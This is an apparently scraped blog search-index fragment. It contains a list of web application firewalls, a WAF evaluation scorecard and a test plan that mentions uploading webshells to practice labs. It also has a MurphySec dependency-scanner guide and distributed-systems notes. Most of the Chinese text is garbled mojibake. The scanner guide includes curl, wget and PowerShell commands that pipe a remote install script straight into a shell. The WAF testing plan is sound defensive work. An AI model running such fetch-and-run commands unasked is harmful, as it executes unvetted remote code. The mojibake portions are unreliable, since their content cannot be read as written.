(Phion&#x2F;Ergon)\nAkamaiGHost Website Protection (Akamai Global Host)\nAlert Logic (SIEMless Threat Management)\nAliYunDun (WAF)\nAnquanbao Web Application Firewall (Anquanbao)\nAnYu Web Application Firewall (Anyu Technologies)\nApache Generic\nArmor Protection (Armor Defense)\nApplication Security Manager (F5 Networks)\nASP.NET Generic Website Protection (MS)\nApache Traffic Server (ATS web proxy)\nAmazon Web Services Web Application Firewall (Amazon)\nYunjiasu Web Application Firewall (Baidu)\nBarikode Web Application Firewall\nBarracuda Web Application Firewall (Barracuda Networks)\nBekchy (WAF)\nBIG-IP (F5 Networks)\nBinarySEC Web Application Firewall (BinarySEC)\nBitninja (WAF)\nBlockDos DDoS protection (BlockDos)\nChuangyu top government cloud defense platform (WAF)\nCisco ACE XML Firewall (Cisco)\nCloudFlare Web Application Firewall (CloudFlare)\nCloudFront Firewall (Amazon)\nXSS&#x2F;CSRF Filtering Protection (CodeIgniter)\nComodo Web Application Firewall (Comodo)\nIBM Websphere DataPower Firewall (IBM)\nDeny All Web Application Firewall (DenyAll)\nDiDiYun WAF (DiDi)\nDoD Enterprise-Level Protection System (Department of Defense)\nDOSarrest (DOSarrest Internet Security)\ndotDefender (Applicure Technologies)\nDynamicWeb Injection Check (DynamicWeb)\nEdgeCast Web Application Firewall (Verizon)\nExpressionEngine (Ellislab WAF)\nFortiWeb Web Application Firewall (Fortinet)\nGladius network WAF (Gladius)\nGoogle Web Services\nGrey Wizard Protection\nIncapsula Web Application Firewall (Incapsula&#x2F;Imperva)\nINFOSAFE by http:&#x2F;&#x2F;7i24.com\nInstart Logic (Palo Alto)\nJanusec Application Gateway (WAF)\nJiasule (WAF)\nLitespeed webserver Generic Protection\nMalcare (MalCare Security WAF)\nOpen Source Web Application Firewall (Modsecurity)\nMod Security (OWASP CSR)\nNexusGuard Security (WAF)\nNginx Generic Protection\nPalo Alto Firewall (Palo Alto Networks)\nAnti Bot Protection (PerimeterX)\npkSecurityModule (IDS)\nPowerful Firewall (MyBB plugin)\nRadware (AppWall WAF)\nRSFirewall (Joomla WAF)\nSabre Firewall (WAF)\nSafeDog WAF (SafeDog)\nSecuPress (Wordpress WAF)\nShadow Daemon Opensource (WAF)\nShield Security\nWebsite Security SiteGuard (Lite)\nSonicWALL Firewall (Dell)\nSquid Proxy (IDS)\nStingray Application Firewall (Riverbed&#x2F;Brocade)\nStrictHttpFirewall (WAF)\nSucuri Firewall (Sucuri Cloudproxy)\nTeros Web Application Firewall (Citrix)\nUEWaf (UCloud)\nUrlScan (Microsoft)\nVarnish&#x2F;CacheWall WAF\nViettel WAF (Cloudrity)\nWallarm WAF\nWebKnight Application Firewall (AQTRONIX)\nIBM Security Access Manager (WebSEAL)\nWest236 Firewall\nWordfence (Feedjit)\nWTS-WAF (Web Application Firewall)\nXuanwudun WAF\nYundun Web Application Firewall (Yundun)\nYunsuo Web Application Firewall (Yunsuo)\nZscaler Cloud Firewall (WAF)\n\n\n\n\n\næ‰“åˆ†è¡¨\n\n\näº§å“åç§°\næŠ€æœ¯æŒ‘æˆ˜æ€§\næŠ€æœ¯å½±å“åŠ›\nå¸‚åœºè¦†ç›–åº¦\näº§å“ç¬¦åˆåº¦\n\n\n\nJanusec\n40\n30\n30\n30\n\n\nModSecurity\n60\n50\n50\n50\n\n\nNgx_waf\n60\n45\n30\n40\n\n\ncoraza\n\n\n\n\n\n\nå…³é”®æŒ‡æ ‡-é€šç”¨äº§å“æè¿°ç•¥\næŠ€æœ¯æè¿°å¸‚åœºç«äº‰å¯¹æ‰‹Funding Roundså…³é”®æŒ‡æ ‡-æŠ€æœ¯\n\n\nå…³é”®åŠŸèƒ½å¯¹æ¯”\næ˜¯å¦å…·å¤‡èƒ½åŠ›\nå¤‡æ³¨\n\n\n\nSQLæ³¨å…¥\n\n\n\n\nCCé˜²å¾¡\n\n\n\n\nBot\n\n\n\n\nä¸šåŠ¡é€»è¾‘æ”»å‡»\n\n\n\n\nOWASP TOP10\n\n\n\n\nè·¨ç«™è„šæœ¬æ”»å‡»\n\n\n\n\næ•æ„Ÿæ•°æ®æ³„éœ²\n\n\n\n\näº§å“æµ‹è¯•åŠŸèƒ½æµ‹è¯•æ­å»ºæµ‹è¯•é¶åœºæ­å»ºpikachué¶åœºä½¿ç”¨[[èµ„æ–™æ•´ç†-çº¢é˜Ÿèµ„æ–™é›†é”¦#å­¦ä¹ é¶åœº]]ä¸­çš„pikachuä½œä¸ºåç«¯æœåŠ¡è¿›è¡Œæµ‹è¯•ï¼Œpikachuæ˜¯PHPå¼€å‘çš„webå®‰å…¨æµ‹è¯•é¶åœºï¼Œdockeréƒ¨ç½²å­˜åœ¨é—®é¢˜ï¼Œåç»­å¯ä»¥ä½¿ç”¨å…¶ä»–é¶åœºå¦‚DVWAè¿›è¡Œæµ‹è¯•ã€‚ğŸ’¡é—®é¢˜å·²è§£å†³ï¼š\n1. ä¿®æ”¹dockerfileé•œåƒ å°†ç¬¬ä¸€è¡Œæ”¹ä¸ºFROM mattrayner&#x2F;lamp:latest-1604-php5\n2. ä¿®æ”¹pkxss&#x2F;inc&#x2F;config.inc.php é…ç½®æ–‡ä»¶ä¸­çš„MySQLå¯†ç  è®¾ç½®ä¸é•œåƒä¸€ç›´ ä¸ºç©º\nDVWAé¶åœº\n å¾…å®‰è£…æµ‹è¯•\n\nå·¥å…·æµ‹è¯•\nä½¿ç”¨OWASP ZAP è¿›è¡ŒOWASP Top 10 æ¼æ´æµ‹è¯•\nä½¿ç”¨AWVSè¿›è¡Œwebå®‰å…¨æµ‹è¯•\nä½¿ç”¨pocæµ‹è¯• å¦‚log4j springcore ç­‰\nä½¿ç”¨clashè¿›è¡Œè¿›è¡ŒIPé»‘ç™½åå•æµ‹è¯•\nCCæ”»å‡»\nä½¿ç”¨Python burpsuite æµè§ˆå™¨ç­‰éªŒè¯SSLæŒ‡çº¹æµ‹è¯•\nä½¿ç”¨ğŸ”ªğŸœå“¥æ–¯æ‹‰ç­‰ä¸Šä¼ webshell å†…å­˜é©¬ç­‰è¿›è¡Œæµ‹è¯•\næµ‹è¯•WAFäº”å…ƒç»„ä»¥åŠContent-typeç»“åˆWAFè§„åˆ™é›†è¿›è¡ŒéªŒè¯\n\næ€§èƒ½æµ‹è¯•ngx_wafæ€§èƒ½æµ‹è¯•æµ‹è¯• | ngx_wafwrkNginxTestl\ncorazaæ€§èƒ½æµ‹è¯•Benchmarks - OWASP Coraza WAF\nå‚è€ƒTest and evaluate your WAF before hackers â˜ï¸å¯¹æŠ—å·¥å…·whatwafGitHub - acouvreur&#x2F;traefik-modsecurity-plugin: Traefik plugin to proxy requests to owasp&#x2F;modsecurity-crs:apache containeripblocks2021å¹´åå¤§å¼€æºwaf - çŸ¥ä¹Traefik Modsecurity PluginPikachuæ¼æ´ç»ƒä¹ å¹³å°å®éªŒâ€”â€”æš´åŠ›ç ´è§£ï¼ˆä¸€ï¼‰ - é‚£å°‘å¹´å’Œç‹— - åšå®¢å›­Pikachuæ¼æ´ç»ƒä¹ å¹³å°å®éªŒâ€”â€”XSSï¼ˆäºŒï¼‰ - é‚£å°‘å¹´å’Œç‹— - åšå®¢å›­Pikachuæ¼æ´ç»ƒä¹ å¹³å°å®éªŒâ€”â€”CSRFï¼ˆä¸‰ï¼‰ - é‚£å°‘å¹´å’Œç‹— - åšå®¢å›­Pikachuæ¼æ´ç»ƒä¹ å¹³å°å®éªŒâ€”â€”SQLæ³¨å…¥ï¼ˆå››ï¼‰ - é‚£å°‘å¹´å’Œç‹— - åšå®¢å›­Pikachuæ¼æ´ç»ƒä¹ å¹³å°å®éªŒâ€”â€”RCEï¼ˆäº”ï¼‰ - é‚£å°‘å¹´å’Œç‹— - åšå®¢å›­Pikachuæ¼æ´ç»ƒä¹ å¹³å°å®éªŒâ€”â€”æ–‡ä»¶åŒ…å«ï¼ˆFile Inclusionï¼‰ï¼ˆå…­ï¼‰ - é‚£å°‘å¹´å’Œç‹— - åšå®¢å›­Pikachuæ¼æ´ç»ƒä¹ å¹³å°å®éªŒâ€”â€”ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½å’Œä¸Šä¼ ï¼ˆä¸ƒï¼‰ - é‚£å°‘å¹´å’Œç‹— - åšå®¢å›­Pikachuæ¼æ´ç»ƒä¹ å¹³å°å®éªŒâ€”â€”è¶Šæƒæ¼æ´ï¼ˆå…«ï¼‰ - é‚£å°‘å¹´å’Œç‹— - åšå®¢å›­Pikachuæ¼æ´ç»ƒä¹ å¹³å°å®éªŒâ€”â€”phpååºåˆ—åŒ–ã€XXEã€SSRFï¼ˆä¹ï¼‰ - é‚£å°‘å¹´å’Œç‹— - åšå®¢å›­\n","slug":"å¼€æºWAFé€‰å‹","date":"2022-06-06T09:53:28.000Z","categories_index":"å¼€æºWAFäº§å“é€‰å‹","tags_index":"WAF,Nginx,å¼€æºWAFäº§å“é€‰å‹,å®‰å…¨å»ºè®¾","author_index":"Moses"},{"id":"f48e91bff7d0e96d07d9f87de6bb94df","title":"è½¯ä»¶ä¾›åº”é“¾å®‰å…¨åˆ†æå·¥å…·-å¢¨è²","content":"è½¯ä»¶ä¾›åº”é“¾å®‰å…¨-å¢¨è²å®‰å…¨ç®€ä»‹å¢¨è²å®‰å…¨çš„Â CLI å·¥å…·ï¼Œç”¨äºåœ¨å‘½ä»¤è¡Œæ£€æµ‹æŒ‡å®šç›®å½•ä»£ç çš„ä¾èµ–å®‰å…¨é—®é¢˜ï¼Œä¹Ÿå¯ä»¥åŸºäº CLI å·¥å…·å®ç°åœ¨ CI æµç¨‹çš„æ£€æµ‹ã€‚\næ”¯æŒçš„è¯­è¨€\n\n\nè¯­è¨€\nåŒ…ç®¡ç†å·¥å…·\næ”¯æŒæƒ…å†µ\nâ—ï¸å®Œæ•´æ£€æµ‹çš„ç¯å¢ƒè¦æ±‚\n\n\n\nJava\nMaven\nâœ…\nå¯é€šè¿‡ Maven åœ¨æœ¬åœ°æˆåŠŸæ„å»ºé¡¹ç›®\n\n\nJava\nGradle\nâœ…\nå¯é€šè¿‡ Gradle åœ¨æœ¬åœ°æˆåŠŸæ„å»ºé¡¹ç›®\n\n\nGo\ngovendor\nâœ…\nå¯é€šè¿‡ Go åœ¨æœ¬åœ°æˆåŠŸæ„å»ºé¡¹ç›®\n\n\nJavaScript\nnpm\nâœ…\næ— è¦æ±‚\n\n\nJavaScript\nyarn\nâœ…\næ— è¦æ±‚\n\n\nPython\npip\nâœ…\næ— è¦æ±‚\n\n\nPHP\nComposer\nâœ…\næ— è¦æ±‚\n\n\nPython\npipenv\nå³å°†æ”¯æŒ\n-\n\n\n.NET\nNuget\nå³å°†æ”¯æŒ\n-\n\n\nSwiftã€Objective-C\nCocoaPods\nå³å°†æ”¯æŒ\n-\n\n\nRuby\nBundler\nå³å°†æ”¯æŒ\n-\n\n\nå·¥ä½œåŸç†\nå¯¹äºä½¿ç”¨ä¸åŒè¯­è¨€&#x2F;åŒ…ç®¡ç†å·¥å…·çš„é¡¹ç›®ï¼Œå¢¨è²å®‰å…¨çš„ CLI å·¥å…·ä¸»è¦é‡‡ç”¨é¡¹ç›®æ„å»ºæˆ–ç›´æ¥å¯¹åŒ…ç®¡ç†æ–‡ä»¶è¿›è¡Œè§£æçš„æ–¹å¼ï¼Œæ¥å‡†ç¡®è·å–åˆ°é¡¹ç›®çš„ä¾èµ–ä¿¡æ¯\né¡¹ç›®çš„ä¾èµ–ä¿¡æ¯ä¼šä¸Šä¼ åˆ°æœåŠ¡ç«¯ï¼Œå¹¶åŸºäºå¢¨è²å®‰å…¨æŒç»­ç»´æŠ¤çš„æ¼æ´çŸ¥è¯†åº“æ¥è¯†åˆ«é¡¹ç›®ä¸­å­˜åœ¨å®‰å…¨ç¼ºé™·çš„ä¾èµ–\n\n\nä½¿ç”¨åœºæ™¯\nå¸Œæœ›åœ¨æœ¬åœ°ç¯å¢ƒä¸­æ£€æµ‹ä»£ç æ–‡ä»¶\nå¸Œæœ›é›†æˆåˆ° CI ç¯å¢ƒä¸­å¯¹ä»£ç é¡¹ç›®è¿›è¡Œæ£€æµ‹\n\nå‚è€ƒï¼šå¢¨è²å®‰å…¨ CLI ä¸ Jenkins CI çš„é›†æˆ\nQuickstartlinux\nwget -q https:&#x2F;&#x2F;s.murphysec.com&#x2F;install.sh -O - | &#x2F;bin&#x2F;bash\nMacOS\ncurl -fsSL https:&#x2F;&#x2F;s.murphysec.com&#x2F;install.sh | &#x2F;bin&#x2F;bash\nWindows\npowershell -Command &quot;iwr -useb https:&#x2F;&#x2F;s.murphysec.com&#x2F;install.ps1 | iex&quot;\n\nå¯¹æ¯”[[ä½¿ç”¨snykæ£€æŸ¥å¼€æºè½¯ä»¶ä¾èµ–ä¸­çš„æ¼æ´.md]]\nReferenceså®˜æ–¹æ–‡æ¡£å¢¨è²å®‰å…¨ | ä¸ºæ‚¨æä¾›ä¸“ä¸šçš„è½¯ä»¶ä¾›åº”é“¾å®‰å…¨ç®¡ç†\n","slug":"è½¯ä»¶ä¾›åº”é“¾å®‰å…¨-å¢¨è²å®‰å…¨","date":"2022-05-29T12:26:00.000Z","categories_index":"è½¯ä»¶ä¾›åº”é“¾å®‰å…¨","tags_index":"SCA,è½¯ä»¶æˆåˆ†åˆ†æå·¥å…·,å¢¨è²å®‰å…¨","author_index":"Moses"},{"id":"1ab18743769cc5b4fe58b2f1026856c9","title":"åˆ†å¸ƒå¼ç³»ç»Ÿå­¦ä¹ ","content":"ç›´è§‚çš„æ„Ÿå—åŒºå—é“¾\næ¯”ç‰¹å¸\nä»¥å¤ªåŠ\n\n\n\n\n\n\n\n\nä¸€ä¸ªè¯æ¥æè¿°åˆ†å¸ƒå¼ç³»ç»Ÿï¼šåˆ†è€Œæ²»ä¹‹\n\n\nåˆ†å¸ƒå¼ç³»ç»Ÿçš„å‰ä¸–ä»Šç”Ÿåˆ†å¸ƒå¼ç³»ç»Ÿçœ‹èµ·æ¥å°±åƒä¸€ä¸ªè®¡ç®—æœºã€‚è®¡ç®—æœºåŒ…æ‹¬äº”å¤§ä½“ç³»ç»“æ„ï¼ˆå³å†¯è¯ºä¾æ›¼ç»“æ„ï¼‰ï¼Œå®ƒæœ‰äº”å¤§éƒ¨ä»¶ï¼šåˆ†åˆ«æ˜¯æ§åˆ¶å™¨ã€è¿ç®—å™¨ã€å­˜å‚¨å™¨ã€è¾“å…¥åŠè¾“å‡ºã€‚Â ä½ å¯ä»¥è¿™ä¹ˆç†è§£ï¼šä¸€ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿä¹ŸåŒ…å«è¿™äº”å¤§éƒ¨ä»¶ï¼Œå…¶ä¸­æœ€é‡è¦çš„æ˜¯è®¡ç®—ä¸å­˜å‚¨ã€‚è®¡ç®—ä¸å­˜å‚¨ç”±ä¸€ç³»åˆ—ç½‘ç»œèŠ‚ç‚¹ç»„æˆï¼Œæ¯ä¸ªèŠ‚ç‚¹ä¹‹é—´çš„é€šä¿¡å°±æ˜¯è¾“å…¥ä¸è¾“å‡ºï¼Œå„èŠ‚ç‚¹ä¹‹é—´çš„è°ƒåº¦ç®¡ç†å°±æ˜¯æ§åˆ¶å™¨ã€‚\n\nå­˜å‚¨å™¨Â ï¼Œå³åˆ†å¸ƒå¼å­˜å‚¨ç³»ç»Ÿï¼Œå¦‚ NoSQL æ•°æ®åº“å­˜å‚¨ï¼›[[åˆ†å¸ƒå¼ç³»ç»Ÿ#åˆ†å¸ƒå¼å­˜å‚¨]]\n\nè¿ç®—å™¨Â ï¼Œå³åˆ†å¸ƒå¼è®¡ç®—ï¼Œå¦‚åˆ†å¸ƒå¼å¹¶è¡Œè®¡ç®—ï¼›[[åˆ†å¸ƒå¼ç³»ç»Ÿ#åˆ†å¸ƒå¼è®¡ç®—]]\n\nè¾“å…¥è¾“å‡ºÂ ï¼Œå³åˆ†å¸ƒå¼ç³»ç»Ÿé€šä¿¡ï¼Œå¦‚åŒæ­¥ RPC è°ƒç”¨å’Œå¼‚æ­¥æ¶ˆæ¯é˜Ÿåˆ—ï¼›[[åˆ†å¸ƒå¼ç³»ç»Ÿ#åˆ†å¸ƒå¼æ¶ˆæ¯é˜Ÿåˆ—]]\n\næ§åˆ¶å™¨Â ï¼Œå³è°ƒåº¦ç®¡ç†ï¼Œå¦‚æµé‡è°ƒåº¦ã€ä»»åŠ¡è°ƒåº¦ä¸èµ„æºè°ƒåº¦ã€‚å¦‚Quartzã€XXL-JOBã€Elastic-Jobã€Apache DolphinScheduler[[Centos7å®‰è£…azkaban]]ç­‰\n\n\nC&#x2F;S æ¶æ„å’Œ B&#x2F;S æ¶æ„\n\n\n\n\n\nC&#x2F;S ç¼ºç‚¹\nå¹³å°å…¼å®¹æ€§Windowsï¼ŒLinux\nä¾‹å¦‚æœ‰äº›åªèƒ½è¿è¡Œåœ¨ windows ä¸Šï¼Œéœ€é’ˆå¯¹ä¸åŒçš„å¹³å°å¼€å‘ä¸åŒçš„ç‰ˆæœ¬\nç‰ˆæœ¬æ›´æ–°å’Œç‰ˆæœ¬å…¼å®¹æ€§\nå¤§å‹ç½‘ç»œæ¸¸æˆï¼Œæ›´æ–°çš„æœŸé—´ï¼Œå¿…é¡»å®Œæˆæ‰èƒ½ç»§ç»­æ¸¸æˆã€‚é­”å…½ä¸–ç•Œï¼ŒåŸç¥\nä¸šåŠ¡å®‰å…¨ï¼šä¾‹å¦‚åƒé¸¡ï¼Œå„ç§è¿è¡Œåœ¨å®¢æˆ·ç«¯çš„å¤–æŒ‚\n\nB&#x2F;S ç¼ºç‚¹\nä¸šåŠ¡é€»è¾‘åœ¨åç«¯æœåŠ¡å™¨æ‰§è¡Œï¼Œéœ€è¦æœåŠ¡æä¾›æ–¹æä¾›å·²å°†èµ„æºã€‚\n\nè¾¹ç•ŒCAPç†è®ºï¼š  Cï¼ˆConsistencyï¼‰æ˜¯æ•°æ®ä¸€è‡´æ€§ã€Aï¼ˆAvailabilityï¼‰æ˜¯æœåŠ¡å¯ç”¨æ€§ã€Pï¼ˆPartition toleranceï¼‰æ˜¯åˆ†åŒºå®¹é”™æ€§ã€‚Cã€Aã€P åªèƒ½åŒæ—¶æ»¡è¶³ä¸¤ä¸ªç›®æ ‡ï¼Œè€Œç”±äºåœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼ŒP æ˜¯å¿…é¡»è¦ä¿ç•™çš„ï¼Œæ‰€ä»¥è¦åœ¨ C å’Œ A é—´è¿›è¡Œå–èˆã€‚å‡å¦‚è¦ä¿è¯æœåŠ¡çš„å¯ç”¨æ€§ï¼Œå°±é€‰æ‹© AP æ¨¡å‹ï¼Œè€Œè¦ä¿è¯ä¸€è‡´æ€§çš„è¯ï¼Œå°±é€‰æ‹© CP æ¨¡å‹ã€‚\nç†è®ºç†è§£ç°åœ¨æœ‰ä¸€ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿ Aï¼Œå®ƒæœ‰ä¸€ä¸ªå‰¯æœ¬ A1ï¼Œåœ¨æ­£å¸¸æƒ…å†µä¸‹ï¼Œå®¢æˆ·ç«¯ Client å†™æ•°æ®åˆ°ç³»ç»Ÿ Aï¼Œç„¶åæ•°æ®ä» A èŠ‚ç‚¹åŒæ­¥åˆ° A1 èŠ‚ç‚¹ï¼Œå†è¿”å›ç»™ Client æˆåŠŸçŠ¶æ€ã€‚è¿™æ—¶ï¼Œå®¢æˆ·ç«¯ Client ä»ä»»ä½•èŠ‚ç‚¹ A æˆ– A1 è¯»å–æ•°æ®ï¼Œéƒ½èƒ½è¯»å–åˆ°æœ€æ–°å†™å…¥çš„æ•°æ®ï¼Œè¯´æ˜ A å’Œ A1 çš„æ•°æ®æ˜¯ä¸€è‡´çš„ï¼Œå¹¶ä¸” A å’Œ A1 ä¹Ÿéƒ½æ˜¯å¯ç”¨çš„ã€‚ä½†ç”±äºç½‘ç»œæ˜¯ä¸å¯é çš„ï¼ŒèŠ‚ç‚¹ A å’Œ A1 çš„ç½‘ç»œéšæ—¶ä¼šå› ä¸ºä¸­æ–­è€Œå‡ºç°åˆ†åŒºã€‚æ‰€è°“ç½‘ç»œåˆ†åŒºå°±æ˜¯ç”±äºç½‘ç»œä¸é€šå¯¼è‡´èŠ‚ç‚¹ A å’Œ A1 è¢«éš”ç¦»åœ¨ä¸åŒçš„ç½‘ç»œå­é›†ä¸­ï¼Œæ­¤æ—¶èŠ‚ç‚¹ A çš„æ•°æ®å°±ä¸èƒ½åŠæ—¶åŒæ­¥åˆ°èŠ‚ç‚¹ A1 ä¸­äº†ã€‚åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼Œç”±äºç½‘ç»œé—®é¢˜å¯¼è‡´çš„ç½‘ç»œåˆ†åŒºæ˜¯å¸¸æ€ã€‚ä¹Ÿå°±æ˜¯è¯´å‡ºç°ç½‘ç»œåˆ†åŒºæ—¶ï¼Œæ ¹æ® CAP ç†è®ºï¼Œéœ€è¦åœ¨ A å’Œ C ä¸­è¿›è¡Œå–èˆï¼Œå³è¦ä¹ˆä¿è¯ç³»ç»Ÿçš„å¯ç”¨æ€§ï¼Œè¦ä¹ˆä¿è¯æ•°æ®ä¸€è‡´æ€§ã€‚\nåˆ†å¸ƒå¼ç³»ç»Ÿçš„å‰æè½¯ä»¶æŒ‰ç…§æ—¢å®šçš„è®¾è®¡æ–¹æ¡ˆæ­£å¸¸è¿è¡Œçš„æƒ…å†µä¸‹ï¼Œè§£å†³å¤æ‚çš„ä¸šåŠ¡åœºæ™¯ã€‚\n\næ—¢å®šçš„è®¾è®¡æ–¹æ¡ˆä¼šè€ƒè™‘  - ç½‘ç»œå¼‚å¸¸ã€‚  - æœåŠ¡å™¨å®•æœºã€‚  - è¿›ç¨‹å´©æºƒç­‰ã€‚\næ—¢å®šçš„ä¸–ç•Œæ–¹æ¡ˆä¸è€ƒè™‘  - äººä¸ºçš„æ¶æ„ä¿®æ”¹ï¼Œä¾‹å¦‚æ¶æ„æ”»å‡»ã€‚  - ä»£ç æ¼æ´ã€‚\næ¦‚å¿µ\nå»ºç«‹åœ¨ç½‘ç»œä¹‹ä¸Šçš„è½¯ä»¶ç³»ç»Ÿã€‚\nè½¯ä»¶ç»„ä»¶åˆ†å¸ƒåœ¨ä¸åŒçš„ç½‘ç»œè®¡ç®—æœºä¸Šã€‚\nè½¯ä»¶ç»„ä»¶ä¹‹é—´çš„é€šä¿¡é€šè¿‡ç½‘ç»œæ¥å®Œæˆã€‚\n\n\n\nåˆ†å¸ƒå¼ç³»ç»Ÿçš„æ‰©å±•xè½´æ–¹å‘æ‰©å±•\nè§£å†³çš„é—®é¢˜ä¸ºäº†è§£å†³å•æœºæ— æ³•æ»¡è¶³å¤§é‡å¹¶å‘è¯·æ±‚ã€‚\nç‰¹ç‚¹\nå¯¹åŒä¸€ä¸ªåº”ç”¨æ‰©å±•å‡ºå¤šä¸ªå‰¯æœ¬ã€‚\néœ€è¦é…ç½®è´Ÿè½½å‡è¡¡å°†å‹åŠ›åˆ†æ•£åˆ°ä¸åŒçš„å‰¯æœ¬ï¼Œå¯ä»¥å°†è¯·æ±‚åˆ†å‘åˆ°ä»»æ„ä¸€ä¸ªå‰¯æœ¬ã€‚\néœ€è¦åº”ç”¨æ˜¯æ— çŠ¶æ€çš„ï¼Œå³å¯ä»¥éšæ—¶ä¸‹çº¿ï¼Œå¯ä»¥éšæ—¶æ‰©å±•å‡ºæ–°çš„å‰¯æœ¬ã€‚\n\nç“¶é¢ˆ è´Ÿè´£ç®¡ç†çŠ¶æ€çš„æ•°ç¼“å­˜æˆ–è€…æ•°æ®åº“è¿™ä¸€å±‚çš„å¤„ç†èƒ½åŠ›ä¼šé€æ¸è¾¾åˆ°ä¸Šçº¿ï¼Œé€šç”¨éœ€è¦å¯ä»¥æ°´å¹³æ‰©å±•ã€‚\nyè½´æ–¹å‘æ‰©å±•è§£å†³çš„é—®é¢˜ä¸ºäº†è§£å†³xå‘¨æ‰©å±•çš„æ•°æ®ç¼“å­˜å±‚å’Œæ•°æ®åº“å±‚çš„å¤„ç†èƒ½åŠ›çš„ä¸Šé™ï¼Œæ”¯æŒæ•°æ®åº“çš„æ°´å¹³æ‰©å±•ã€‚\nç‰¹ç‚¹\næŒ‰ç…§ä¸šåŠ¡é¢†åŸŸæ‹†åˆ†æˆå¤šä¸ªåº”ç”¨ã€‚\nä¾‹å¦‚åœ¨ç”µå•†ç³»ç»Ÿä¸­ï¼Œå•†å“è¯¦æƒ…é¡µå¯èƒ½å°±æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„å­ç³»ç»Ÿï¼Œæœ‰å¤šå±‚åº”ç”¨æœåŠ¡å™¨ã€å¤šå±‚ç¼“å­˜æœºåˆ¶ã€å¤šä¸ªæ•°æ®åº“ç»„æˆï¼Œå¹¶ä¸”ç”±ä¸€ä¸ªåºå¤§çš„éƒ¨é—¨ç‹¬ç«‹ç»´æŠ¤è€…ã€‚\n\nç“¶é¢ˆ** å³ä¾¿æ˜¯æŒ‰ä¸šåŠ¡é¢†åŸŸæ‹†åˆ†åï¼ŒæŸä¸ªæå°çš„é¢†åŸŸä»æ—§æœ‰æµ·é‡æ•°æ®è¦ç®¡ç†ï¼Œæ•°æ®åº“ä»æ—§æœ‰ç“¶é¢ˆã€‚ä¾‹å¦‚å¤§å‹ç”µå•†çš„è®¢å•ç³»ç»Ÿã€‚**\nzè½´æ–¹å‘æ‰©å±•è§£å†³çš„é—®é¢˜è§£å†³æ‹†åˆ†çš„æŸä¸€ä¸ªæå°ä¸šåŠ¡é¢†åŸŸçš„æµ·é‡æ•°æ®æ— æ³•é å•ä¸ªæ•°æ®åº“æ‰¿è½½çš„é—®é¢˜ã€‚\nç‰¹ç‚¹\nå¯¹æŸä¸€é¢†åŸŸçš„æ•°æ®åšåˆ†ç‰‡ã€‚\néœ€è¦æœ‰æ•°æ®è¯»å†™çš„åˆ†ç‰‡è·¯ç”±è§„åˆ™ã€‚\nåˆ†ç‰‡çš„åŠ¨æ€æ‰©å±•ã€‚\n\nç“¶é¢ˆ ğŸ¤¦â€â™‚ï¸å¦‚ä½•æŠŠæ•°æ®ä¿å­˜åˆ°å¤šå°æœåŠ¡å™¨ä¸Š\n\n1.ä»æ—§è§†åŒå…³ç³»å‹æ•°æ®åº“ï¼Œåšåˆ†åº“åˆ†è¡¨ã€‚è¿™ç§æ¶æ„çš„éš¾ç‚¹æ˜¯å½“åˆ†åº“åˆ†è¡¨è§„åˆ™å‘ç”Ÿå˜åŒ–æ—¶çš„æ•°æ®è¿ç§»é—®é¢˜ã€‚\næ•°æ®è¿ç§»ï¼š\nå…¨é‡çš„æ•°æ®è¿ç§»ï¼Œåˆ†ç‰‡è·¯ç”±ç®—æ³•ä¸€èˆ¬æ˜¯æ ¹æ®æŸä¸ªidå–ä½™ã€‚\néƒ¨åˆ†æ•°æ®çš„è¿ç§»ï¼Œåˆ†ç‰‡è·¯ç”±ç®—æ³•å¯ä»¥ç”¨ä¸€è‡´æ€§å“ˆå¸Œã€‚\n\n\næ•°æ®æŸ¥è¯¢ï¼š\næœ‰äº›å¤æ‚æŸ¥è¯¢ï¼Œä¼šåœ¨å¤šä¸ªæ•°æ®åº“æœåŠ¡å™¨ä¸Šæ‰§è¡Œsqlï¼Œç„¶ååˆå¹¶æ‰§è¡Œç»“æœï¼Œéœ€è¦å¤„ç†å„ç§å¼‚å¸¸ã€‚\nåƒåˆ†é¡µç­‰æŸ¥è¯¢ï¼Œæ¶‰åŠåˆ°å¤§é‡æ•°æ®çš„å½’å¹¶ï¼Œå­˜åœ¨æ•ˆç‡é—®é¢˜ã€‚\n\n\nå¼€æºæ•°æ®åº“ä¸­é—´ä»¶\nä»…åœ¨ç¼–ç å±‚é¢è§£å†³äº†é¢å‘å¤šæ•°æ®ç¼–ç¨‹çš„é—®é¢˜ï¼Œæ ¸å¿ƒæ€è·¯ä»æ—§æ˜¯å¤šä¸ªsqlåœ¨ä¸åŒçš„æ•°æ®åº“æœåŠ¡å™¨ä¸Šæ‰§è¡Œã€‚\n\n\næœ€é‡è¦çš„ä¸€ä¸ªéš¾é¢˜æ˜¯ï¼Œè¿™ç§æ¶æ„ä¿è¯æ•°æ®çš„ä¸€è‡´æ€§å¾ˆæœ‰æŒ‘æˆ˜ã€‚\n\n\n2.æ”¾å¼ƒSQLçš„ä¾¿åˆ©æ€§ï¼Œé‡‡ç”¨åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿä¿å­˜æµ·é‡æ•°æ®ã€‚\nå¯ä»¥ä½¿ç”¨HDFSå­˜å‚¨æ•°æ®ï¼ŒHDFSæä¾›äº†å¯é çš„æ•°æ®å­˜å‚¨èƒ½åŠ›å’Œå¼ºä¸€è‡´æ€§ã€‚\n\n\n3.åœ¨åœ¨çº¿æœåŠ¡(OLTP)æ–¹é¢ï¼Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨NoSQLæ•°æ®åº“æ¥å­˜å‚¨æ•°æ®ã€‚\n4.ä½¿ç”¨NewSQLæ•°æ®åº“ã€‚NewSQLå¹¶æ²¡æœ‰å»æ‰å¯¹SQLçš„æ”¯æŒï¼ŒåŒæ—¶å…·å¤‡è‰¯å¥½çš„æ°´å¹³æ‰©å±•èƒ½åŠ›ã€å¯é 